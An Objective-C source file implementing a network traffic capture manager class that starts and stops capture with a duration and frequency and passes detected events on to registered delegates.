//
//  NetworkTrafficCaptureManager.m
//  NetworkTrafficCaptureManager
//
//  Created by ophat on 10/9/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "NetworkTrafficCaptureManagerImpl.h"
#import "NetworkTrafficCaptureDelegate.h"
#import "NetworkTrafficCapture.h"

@implementation NetworkTrafficCaptureManagerImpl
@synthesize mNetworkTrafficCapture;
@synthesize mDelegateForCallback;

- (id) initWithFilterOutURL:(NSString *)aURL{
    if ((self = [super init])) {
        mNetworkTrafficCapture = [[NetworkTrafficCapture alloc]init];
        [mNetworkTrafficCapture setMMyUrl:aURL];
        [mNetworkTrafficCapture setMDelegate:self];
        [mNetworkTrafficCapture setMSelector:@selector(NetworkTrafficEventDetected:)];
        [mNetworkTrafficCapture setMThread:[NSThread currentThread]];
    }
    return self;
}

- (void) NetworkTrafficEventDetected: (FxEvent *) aEvent {
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
        DLog(@"NetworkTrafficEventDetected event: %@", aEvent);
        [mEventDelegate eventFinished:aEvent];
    }
    if (mDelegateForCallback) {
        [mDelegateForCallback networkTrafficCaptureCompleted:nil];
    }
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
    mEventDelegate = aEventDelegate;
}

- (void) unregisterEventDelegate {
    mEventDelegate = nil;
}

- (BOOL) startCaptureWithDuration:(int)aMin frequency:(int)aFre withDelegate:(id<NetworkTrafficCaptureDelegate>) aDelegate {
    mDelegateForCallback = aDelegate;
    BOOL result = [mNetworkTrafficCapture startCaptureWithDuration:aMin frequency:aFre];
    return result;
}

-(void) startCapture{

}

- (void) stopCapture{
    [mNetworkTrafficCapture stopCapture];
}

-(void) dealloc{ 
    [mNetworkTrafficCapture release];
    [super dealloc];
}
@end
